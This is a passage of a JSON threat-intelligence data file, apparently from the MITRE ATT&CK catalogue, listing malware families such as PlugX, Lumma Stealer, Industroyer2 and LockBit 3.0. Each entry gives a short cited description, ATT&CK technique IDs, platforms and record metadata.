      "description": "[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) with modular plugins that has been used by multiple threat groups.(Citation: Lastline PlugX Analysis)(Citation: FireEye Clandestine Fox Part 2)(Citation: New DragonOK)(Citation: Dell TG-3390)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1083",
        "T1036.004",
        "T1564.001",
        "T1095",
        "T1056.001",
        "T1102.001",
        "T1057",
        "T1012",
        "T1574.001",
        "T1135",
        "T1127.001",
        "T1071.001",
        "T1543.003",
        "T1059.003",
        "T1105",
        "T1497.001",
        "T1049",
        "T1562.004",
        "T1036.005",
        "T1547.001",
        "T1071.004",
        "T1113",
        "T1573.001",
        "T1571",
        "T1140",
        "T1106",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0013",
      "stix_id": "malware--64fa0de0-6240-41f4-8638-f4ca7ed528fd",
      "created": "2017-05-31T21:32:15.638000+00:00",
      "modified": "2025-04-04T17:15:48.780000+00:00"
    },
    "S0172": {
      "id": "S0172",
      "name": "Reaver",
      "description": "[Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the \"Five Poisons,\" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of [Control Panel](https://attack.mitre.org/techniques/T1218/002) items.(Citation: Palo Alto Reaver Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.009",
        "T1070.004",
        "T1547.001",
        "T1027.013",
        "T1095",
        "T1071.001",
        "T1560.003",
        "T1218.002",
        "T1033",
        "T1543.003",
        "T1082",
        "T1012",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0172",
      "stix_id": "malware--65341f30-bec6-4b1d-8abf-1a5620446c29",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-04-11T00:21:09.543000+00:00"
    },
    "S0268": {
      "id": "S0268",
      "name": "Bisonal",
      "description": "[Bisonal](https://attack.mitre.org/software/S0268) is a remote access tool (RAT) that has been used by [Tonto Team](https://attack.mitre.org/groups/G0131) against public and private sector organizations in Russia, South Korea, and Japan since at least December 2010.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1070.004",
        "T1573.001",
        "T1057",
        "T1105",
        "T1497",
        "T1543.003",
        "T1137.006",
        "T1059.005",
        "T1140",
        "T1027.013",
        "T1083",
        "T1547.001",
        "T1005",
        "T1497.003",
        "T1071.001",
        "T1112",
        "T1218.011",
        "T1204.002",
        "T1027.001",
        "T1566.001",
        "T1132.001",
        "T1012",
        "T1027.002",
        "T1041",
        "T1095",
        "T1090",
        "T1059.003",
        "T1082",
        "T1568",
        "T1016",
        "T1124",
        "T1036.005",
        "T1036"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0268",
      "stix_id": "malware--65ffc206-d7c1-45b3-b543-f6b726e7840d",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T02:53:35.918000+00:00"
    },
    "S1135": {
      "id": "S1135",
      "name": "MultiLayer Wiper",
      "description": "[MultiLayer Wiper](https://attack.mitre.org/software/S1135) is wiper malware written in .NET associated with [Agrius](https://attack.mitre.org/groups/G1030) operations. Observed samples of [MultiLayer Wiper](https://attack.mitre.org/software/S1135) have an anomalous, future compilation date suggesting possible metadata manipulation.(Citation: Unit42 Agrius 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1529",
        "T1070",
        "T1565.001",
        "T1562.001",
        "T1070.004",
        "T1485",
        "T1027.009",
        "T1059.003",
        "T1070.001",
        "T1490",
        "T1053.005",
        "T1070.006",
        "T1561.002",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1135",
      "stix_id": "malware--663d7dee-5a47-459e-a5ef-e850a94a8ee5",
      "created": "2024-05-22T22:30:59.178000+00:00",
      "modified": "2024-08-29T15:20:13.078000+00:00"
    },
    "S0085": {
      "id": "S0085",
      "name": "S-Type",
      "description": "[S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2013.(Citation: Cylance Dust Storm)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1033",
        "T1041",
        "T1105",
        "T1008",
        "T1071.001",
        "T1059.003",
        "T1614.001",
        "T1136.001",
        "T1070.004",
        "T1082",
        "T1132.001",
        "T1547.009",
        "T1027.002",
        "T1070.009",
        "T1016",
        "T1007",
        "T1106",
        "T1547.001",
        "T1087.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0085",
      "stix_id": "malware--66b1dcde-17a0-4c7b-95fa-b08d430c2131",
      "created": "2017-05-31T21:32:55.925000+00:00",
      "modified": "2025-04-16T20:38:13.738000+00:00"
    },
    "S1213": {
      "id": "S1213",
      "name": "Lumma Stealer",
      "description": "[Lumma Stealer](https://attack.mitre.org/software/S1213) is an information stealer malware family in use since at least 2022. [Lumma Stealer](https://attack.mitre.org/software/S1213) is a Malware as a Service (MaaS) where captured data has been sold in criminal markets to Initial Access Brokers.(Citation: Cybereason LumaStealer Undated)(Citation: Netskope LummaStealer 2025)(Citation: Qualys LummaStealer 2024)(Citation: Fortinet LummaStealer 2024)(Citation: TrendMicro LummaStealer 2025)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1622",
        "T1059.010",
        "T1195",
        "T1113",
        "T1555.003",
        "T1518.001",
        "T1140",
        "T1055.012",
        "T1562.001",
        "T1218.015",
        "T1497.001",
        "T1218.005",
        "T1574.001",
        "T1547.001",
        "T1176.001",
        "T1074.001",
        "T1041",
        "T1204",
        "T1036.008",
        "T1027",
        "T1059.001",
        "T1119",
        "T1620",
        "T1204.002",
        "T1027.013",
        "T1553.002",
        "T1217",
        "T1539",
        "T1573.002",
        "T1071.001",
        "T1566.001",
        "T1059.006",
        "T1564.003",
        "T1566.002",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1213",
      "stix_id": "malware--674c514f-e485-47a8-9d49-1aaa70de155b",
      "created": "2025-03-22T15:05:50.305000+00:00",
      "modified": "2025-03-22T16:02:03.819000+00:00"
    },
    "S0053": {
      "id": "S0053",
      "name": "SeaDuke",
      "description": "[SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1550.003",
        "T1132.001",
        "T1078",
        "T1560.002",
        "T1105",
        "T1070.004",
        "T1114.002",
        "T1027.002",
        "T1071.001",
        "T1547.001",
        "T1573.001",
        "T1547.009",
        "T1059.001",
        "T1546.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0053",
      "stix_id": "malware--67e6d66b-1b82-4699-b47a-e2efb6268d14",
      "created": "2017-05-31T21:32:37.767000+00:00",
      "modified": "2025-04-25T14:43:37.740000+00:00"
    },
    "S0014": {
      "id": "S0014",
      "name": "BS2005",
      "description": "[BS2005](https://attack.mitre.org/software/S0014) is malware that was used by [Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least 2011. (Citation: Mandiant Operation Ke3chang November 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1132.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0014",
      "stix_id": "malware--67fc172a-36fa-4a35-88eb-4ba730ed52a6",
      "created": "2017-05-31T21:32:15.994000+00:00",
      "modified": "2025-04-25T14:43:38.100000+00:00"
    },
    "S0062": {
      "id": "S0062",
      "name": "DustySky",
      "description": "[DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. (Citation: DustySky) (Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1518",
        "T1070.004",
        "T1091",
        "T1027",
        "T1560.001",
        "T1041",
        "T1056.001",
        "T1120",
        "T1047",
        "T1074.001",
        "T1547.001",
        "T1113",
        "T1518.001",
        "T1570",
        "T1008",
        "T1082",
        "T1057",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0062",
      "stix_id": "malware--687c23e4-4e25-4ee7-a870-c5e002511f54",
      "created": "2017-05-31T21:32:41.750000+00:00",
      "modified": "2025-04-25T14:43:38.466000+00:00"
    },
    "S0038": {
      "id": "S0038",
      "name": "Duqu",
      "description": "[Duqu](https://attack.mitre.org/software/S0038) is a malware platform that uses a modular approach to extend functionality after deployment within a target network. (Citation: Symantec W32.Duqu)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1560.003",
        "T1090.001",
        "T1218.007",
        "T1087.001",
        "T1057",
        "T1078",
        "T1543.003",
        "T1572",
        "T1074.001",
        "T1055.001",
        "T1573.001",
        "T1071",
        "T1021.002",
        "T1049",
        "T1134",
        "T1010",
        "T1053.005",
        "T1001.002",
        "T1016",
        "T1055.012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0038",
      "stix_id": "malware--68dca94f-c11d-421e-9287-7c501108e18c",
      "created": "2017-05-31T21:32:31.188000+00:00",
      "modified": "2025-04-16T20:38:14.352000+00:00"
    },
    "S0178": {
      "id": "S0178",
      "name": "Truvasys",
      "description": "[Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep 2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1036.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0178",
      "stix_id": "malware--691c60e2-273d-4d56-9ce6-b67e0f8719ad",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:43:39.011000+00:00"
    },
    "S0125": {
      "id": "S0125",
      "name": "Remsec",
      "description": "[Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. (Citation: Symantec Strider Blog)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.001",
        "T1068",
        "T1052.001",
        "T1083",
        "T1048.003",
        "T1049",
        "T1070.004",
        "T1056.001",
        "T1057",
        "T1027.013",
        "T1556.002",
        "T1036.005",
        "T1095",
        "T1018",
        "T1071.003",
        "T1059.011",
        "T1105",
        "T1003.002",
        "T1562.004",
        "T1025",
        "T1082",
        "T1087.001",
        "T1053",
        "T1016",
        "T1033",
        "T1652",
        "T1071.001",
        "T1046",
        "T1518.001",
        "T1071.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0125",
      "stix_id": "malware--69d6f4a9-fcf0-4f51-bca7-597c51ad0bb8",
      "created": "2017-05-31T21:33:12.858000+00:00",
      "modified": "2024-08-05T18:23:59.724000+00:00"
    },
    "S1072": {
      "id": "S1072",
      "name": "Industroyer2",
      "description": "[Industroyer2](https://attack.mitre.org/software/S1072) is a compiled and static piece of malware that has the ability to communicate over the IEC-104 protocol. It is similar to the IEC-104 module found in [Industroyer](https://attack.mitre.org/software/S0604). Security researchers assess that [Industroyer2](https://attack.mitre.org/software/S1072) was designed to cause impact to high-voltage electrical substations. The initial [Industroyer2](https://attack.mitre.org/software/S1072) sample was compiled on 03/23/2022 and scheduled to execute on 04/08/2022, however it was discovered before deploying, resulting in no impact.(Citation: Industroyer2 Blackhat ESET)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057"
      ],
      "platforms": [
        "Field Controller/RTU/PLC/IED",
        "Engineering Workstation"
      ],
      "url": "https://attack.mitre.org/software/S1072",
      "stix_id": "malware--6a0d0ea9-b2c4-43fe-a552-ac41a3009dc5",
      "created": "2023-03-30T19:20:45.556000+00:00",
      "modified": "2025-04-16T20:38:14.728000+00:00"
    },
    "S0018": {
      "id": "S0018",
      "name": "Sykipot",
      "description": "[Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has also been referred to as Sykipot. (Citation: Blasco 2013)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1007",
        "T1573.002",
        "T1111",
        "T1087.002",
        "T1057",
        "T1056.001",
        "T1018",
        "T1049",
        "T1016",
        "T1547.001",
        "T1055.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0018",
      "stix_id": "malware--6a0ef5d4-fc7c-4dda-85d7-592e4dbdc5d9",
      "created": "2017-05-31T21:32:17.568000+00:00",
      "modified": "2025-04-25T14:43:39.731000+00:00"
    },
    "S0569": {
      "id": "S0569",
      "name": "Explosive",
      "description": "[Explosive](https://attack.mitre.org/software/S0569) is a custom-made remote access tool used by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123). It was first identified in the wild in 2015.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)  ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1112",
        "T1025",
        "T1056.001",
        "T1033",
        "T1573.001",
        "T1105",
        "T1071.001",
        "T1106",
        "T1115",
        "T1082",
        "T1564.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0569",
      "stix_id": "malware--6a21e3a4-5ffe-4581-af9a-6a54c7536f44",
      "created": "2021-02-08T21:41:25.501000+00:00",
      "modified": "2025-04-25T14:43:40.097000+00:00"
    },
    "S0341": {
      "id": "S0341",
      "name": "Xbash",
      "description": "[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1485",
        "T1059.005",
        "T1218.005",
        "T1547.001",
        "T1053.003",
        "T1203",
        "T1105",
        "T1059.001",
        "T1059.007",
        "T1046",
        "T1486",
        "T1110.001",
        "T1218.010",
        "T1016",
        "T1102.001"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0341",
      "stix_id": "malware--6a92d80f-cc65-45f6-aa66-3cdea6786b3c",
      "created": "2019-01-30T13:28:47.452000+00:00",
      "modified": "2025-04-25T14:43:40.462000+00:00"
    },
    "S0090": {
      "id": "S0090",
      "name": "Rover",
      "description": "[Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. (Citation: Palo Alto Rover)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1119",
        "T1020",
        "T1113",
        "T1025",
        "T1005",
        "T1074.001",
        "T1112",
        "T1083",
        "T1056.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0090",
      "stix_id": "malware--6b616fc1-1505-48e3-8b2c-0d19337bff38",
      "created": "2017-05-31T21:32:58.226000+00:00",
      "modified": "2025-04-25T14:43:40.835000+00:00"
    },
    "S0091": {
      "id": "S0091",
      "name": "Epic",
      "description": "[Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1057",
        "T1071.001",
        "T1033",
        "T1124",
        "T1083",
        "T1070.004",
        "T1082",
        "T1049",
        "T1018",
        "T1560.002",
        "T1055.011",
        "T1553.002",
        "T1087.001",
        "T1560",
        "T1069.001",
        "T1573.001",
        "T1016",
        "T1007",
        "T1518.001",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0091",
      "stix_id": "malware--6b62e336-176f-417b-856a-8552dd8c44e1",
      "created": "2017-05-31T21:32:58.738000+00:00",
      "modified": "2025-04-25T14:43:41.197000+00:00"
    },
    "S0395": {
      "id": "S0395",
      "name": "LightNeuron",
      "description": "[LightNeuron](https://attack.mitre.org/software/S0395) is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014. [LightNeuron](https://attack.mitre.org/software/S0395) has been used by [Turla](https://attack.mitre.org/groups/G0010) to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: ESET LightNeuron May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1071.003",
        "T1029",
        "T1020",
        "T1041",
        "T1027.013",
        "T1001.002",
        "T1140",
        "T1560",
        "T1036.005",
        "T1114.002",
        "T1082",
        "T1105",
        "T1119",
        "T1573.001",
        "T1074.001",
        "T1059.003",
        "T1005",
        "T1565.002",
        "T1016",
        "T1106",
        "T1505.002"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0395",
      "stix_id": "malware--6ba1d7ae-d60b-43e6-9f08-a8b787e9d9cb",
      "created": "2019-06-28T13:09:26.710000+00:00",
      "modified": "2024-04-11T01:37:19.602000+00:00"
    },
    "S0643": {
      "id": "S0643",
      "name": "Peppy",
      "description": "[Peppy](https://attack.mitre.org/software/S0643) is a Python-based remote access Trojan, active since at least 2012, with similarities to [Crimson](https://attack.mitre.org/software/S0115).(Citation: Proofpoint Operation Transparent Tribe March 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1105",
        "T1071.001",
        "T1059.003",
        "T1020",
        "T1113",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0643",
      "stix_id": "malware--6c2550d5-a01a-4bbb-a004-6ead348ba623",
      "created": "2021-09-07T15:11:17.444000+00:00",
      "modified": "2025-04-25T14:43:41.735000+00:00"
    },
    "S1051": {
      "id": "S1051",
      "name": "KEYPLUG",
      "description": "[KEYPLUG](https://attack.mitre.org/software/S1051) is a modular backdoor written in C++, with Windows and Linux variants, that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least June 2021.(Citation: Mandiant APT41)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1124",
        "T1102.001",
        "T1027.013",
        "T1140",
        "T1573.002",
        "T1090",
        "T1095"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1051",
      "stix_id": "malware--6c575670-d14c-4c7f-9b9d-fd1b363e255d",
      "created": "2022-12-12T15:47:08.197000+00:00",
      "modified": "2024-04-11T01:46:20.169000+00:00"
    },
    "S0625": {
      "id": "S0625",
      "name": "Cuba",
      "description": "\n[Cuba](https://attack.mitre.org/software/S0625) is a Windows-based ransomware family that has been used against financial institutions, technology, and logistics organizations in North and South America as well as Europe since at least December 2019.(Citation: McAfee Cuba April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1543.003",
        "T1027.002",
        "T1106",
        "T1614.001",
        "T1486",
        "T1135",
        "T1059.003",
        "T1070.004",
        "T1620",
        "T1059.001",
        "T1083",
        "T1105",
        "T1056.001",
        "T1027",
        "T1489",
        "T1016",
        "T1049",
        "T1007",
        "T1057",
        "T1134",
        "T1036.005",
        "T1564.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0625",
      "stix_id": "malware--6cd07296-14aa-403d-9229-6343d03d4752",
      "created": "2021-06-18T22:05:58.411000+00:00",
      "modified": "2025-04-25T14:43:42.282000+00:00"
    },
    "S0616": {
      "id": "S0616",
      "name": "DEATHRANSOM",
      "description": "[DEATHRANSOM](https://attack.mitre.org/software/S0616) is ransomware written in C that has been used since at least 2020, and has potential overlap with [FIVEHANDS](https://attack.mitre.org/software/S0618) and [HELLOKITTY](https://attack.mitre.org/software/S0617).(Citation: FireEye FiveHands April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1071.001",
        "T1490",
        "T1083",
        "T1614.001",
        "T1105",
        "T1047",
        "T1082",
        "T1135"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0616",
      "stix_id": "malware--6de9cad1-eed2-4e27-b0b5-39fa29349ea0",
      "created": "2021-06-02T15:48:55.838000+00:00",
      "modified": "2025-04-25T14:43:42.648000+00:00"
    },
    "S0660": {
      "id": "S0660",
      "name": "Clambling",
      "description": "[Clambling](https://attack.mitre.org/software/S0660) is a modular backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2017.(Citation: Trend Micro DRBControl February 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1125",
        "T1095",
        "T1564.001",
        "T1102.002",
        "T1113",
        "T1497.003",
        "T1012",
        "T1083",
        "T1547.001",
        "T1204.002",
        "T1567.002",
        "T1027",
        "T1569.002",
        "T1055",
        "T1566.001",
        "T1115",
        "T1059.003",
        "T1082",
        "T1135",
        "T1071",
        "T1056.001",
        "T1055.012",
        "T1140",
        "T1057",
        "T1124",
        "T1112",
        "T1071.001",
        "T1548.002",
        "T1543.003",
        "T1033",
        "T1059.001",
        "T1016",
        "T1005",
        "T1574.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0660",
      "stix_id": "malware--6e95feb1-78ee-48d3-b421-4d76663b5c49",
      "created": "2021-11-12T20:54:55.974000+00:00",
      "modified": "2025-04-25T14:43:43.008000+00:00"
    },
    "S1129": {
      "id": "S1129",
      "name": "Akira",
      "description": "[Akira](https://attack.mitre.org/software/S1129) ransomware, written in C++, is most prominently (but not exclusively) associated with the ransomware-as-a-service entity [Akira](https://attack.mitre.org/groups/G1024). [Akira](https://attack.mitre.org/software/S1129) ransomware has been used in attacks across North America, Europe, and Australia, with a focus on critical infrastructure sectors including manufacturing, education, and IT services. [Akira](https://attack.mitre.org/software/S1129) ransomware employs hybrid encryption and threading to increase the speed and efficiency of encryption and runtime arguments for tailored attacks. Notable variants include Rust-based [Megazord](https://attack.mitre.org/software/S1191) for targeting Windows and [Akira _v2](https://attack.mitre.org/software/S1194) for targeting VMware ESXi servers.(Citation: Kersten Akira 2023)(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1082",
        "T1059.001",
        "T1047",
        "T1059.003",
        "T1135",
        "T1106",
        "T1490",
        "T1057",
        "T1486"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1129",
      "stix_id": "malware--6f6b2353-4b39-40ce-9d6d-d00b7a61e656",
      "created": "2024-04-04T17:59:46.698000+00:00",
      "modified": "2025-03-11T15:37:13.258000+00:00"
    },
    "S1111": {
      "id": "S1111",
      "name": "DarkGate",
      "description": "[DarkGate](https://attack.mitre.org/software/S1111) first emerged in 2018 and has evolved into an initial access and data gathering tool associated with various criminal cyber operations. Written in Delphi and named \"DarkGate\" by its author, [DarkGate](https://attack.mitre.org/software/S1111) is associated with credential theft, cryptomining, cryptotheft, and pre-ransomware actions.(Citation: Ensilo Darkgate 2018) DarkGate use increased significantly starting in 2022 and is under active development by its author, who provides it as a Malware-as-a-Service offering.(Citation: Trellix Darkgate 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1569.002",
        "T1071.004",
        "T1119",
        "T1574",
        "T1480",
        "T1548.002",
        "T1622",
        "T1486",
        "T1566.002",
        "T1614",
        "T1010",
        "T1070.004",
        "T1036.007",
        "T1547.001",
        "T1041",
        "T1027.013",
        "T1552",
        "T1005",
        "T1047",
        "T1027",
        "T1490",
        "T1562.001",
        "T1036.003",
        "T1059.001",
        "T1496.001",
        "T1136.001",
        "T1056.001",
        "T1059.010",
        "T1665",
        "T1105",
        "T1057",
        "T1583.001",
        "T1555",
        "T1083",
        "T1106",
        "T1140",
        "T1204.002",
        "T1124",
        "T1518.001",
        "T1566.001",
        "T1657",
        "T1115",
        "T1574.001",
        "T1134.004",
        "T1574.007",
        "T1539",
        "T1098.007",
        "T1059.005",
        "T1564.001",
        "T1529",
        "T1001",
        "T1497.001",
        "T1561.001",
        "T1036",
        "T1055.012",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1111",
      "stix_id": "malware--6f6f67c9-556d-4459-95c2-78d272190e52",
      "created": "2024-02-09T19:52:30.428000+00:00",
      "modified": "2025-04-22T22:18:48.564000+00:00"
    },
    "S1026": {
      "id": "S1026",
      "name": "Mongall",
      "description": "[Mongall](https://attack.mitre.org/software/S1026) is a backdoor that has been used since at least 2013, including by [Aoqin Dragon](https://attack.mitre.org/groups/G1007).(Citation: SentinelOne Aoqin Dragon June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1140",
        "T1204.002",
        "T1120",
        "T1573.001",
        "T1218.011",
        "T1005",
        "T1132.001",
        "T1105",
        "T1041",
        "T1055.001",
        "T1082",
        "T1027.002",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1026",
      "stix_id": "malware--6fb36c6f-bb3d-4ed6-9471-cb9933e5c154",
      "created": "2022-07-25T17:00:15.045000+00:00",
      "modified": "2025-04-16T20:38:16.324000+00:00"
    },
    "S0228": {
      "id": "S0228",
      "name": "NanHaiShu",
      "description": "[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1059.007",
        "T1059.005",
        "T1016",
        "T1562.001",
        "T1105",
        "T1070.004",
        "T1218.005",
        "T1071.004",
        "T1547.001",
        "T1082",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0228",
      "stix_id": "malware--705f0783-5f7d-4491-b6b7-9628e6e006d2",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-04-11T00:37:11.186000+00:00"
    },
    "S1202": {
      "id": "S1202",
      "name": "LockBit 3.0",
      "description": "[LockBit 3.0](https://attack.mitre.org/software/S1202) is an evolution of the LockBit Ransomware-as-a-Service (RaaS) offering with similarities to BlackMatter and [BlackCat](https://attack.mitre.org/software/S1068) ransomware. [LockBit 3.0](https://attack.mitre.org/software/S1202) has been in use since at least June 2022 and features enhanced defense evasion and exfiltration tactics, robust encryption methods for Windows and VMware ESXi systems, and a more refined RaaS structure over its predecessors such as [LockBit 2.0](https://attack.mitre.org/software/S1199).(Citation: Sentinel Labs LockBit 3.0 JUL 2022)(Citation: Joint Cybersecurity Advisory LockBit JUN 2023)(Citation: Joint Cybersecurity Advisory LockBit 3.0 MAR 2023)(Citation: INCIBE-CERT LockBit MAR 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1070.001",
        "T1573.001",
        "T1548.002",
        "T1484.001",
        "T1059.001",
        "T1112",
        "T1480.002",
        "T1027.013",
        "T1027.002",
        "T1562.009",
        "T1543.003",
        "T1569.002",
        "T1071.001",
        "T1106",
        "T1480",
        "T1070.004",
        "T1218.003",
        "T1083",
        "T1082",
        "T1135",
        "T1562.001",
        "T1132.001",
        "T1622",
        "T1489",
        "T1547.004",
        "T1057",
        "T1614.001",
        "T1120",
        "T1486",
        "T1021.002",
        "T1078.003",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1202",
      "stix_id": "malware--71fe9df1-1c6f-430c-ab9b-ff3c11074e52",
      "created": "2025-02-05T21:28:23.240000+00:00",
      "modified": "2025-02-06T19:00:57.083000+00:00"
    },
    "S1064": {
      "id": "S1064",
      "name": "SVCReady",
      "description": "[SVCReady](https://attack.mitre.org/software/S1064) is a loader that has been used since at least April 2022 in malicious spam campaigns. Security researchers have noted overlaps between [TA551](https://attack.mitre.org/groups/G0127) activity and [SVCReady](https://attack.mitre.org/software/S1064) distribution, including similarities in file names, lure images, and identical grammatical errors.(Citation: HP SVCReady Jun 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1027",
        "T1204.002",
        "T1005",
        "T1566.001",
        "T1036.004",
        "T1059.005",
        "T1218.011",
        "T1053.005",
        "T1105",
        "T1041",
        "T1071.001",
        "T1120",
        "T1033",
        "T1546.015",
        "T1113",
        "T1124",
        "T1106",
        "T1047",
        "T1082",
        "T1497.001",
        "T1057",
        "T1518",
        "T1497.003"
      ],
      "platforms": [
        "Windows"
      ],
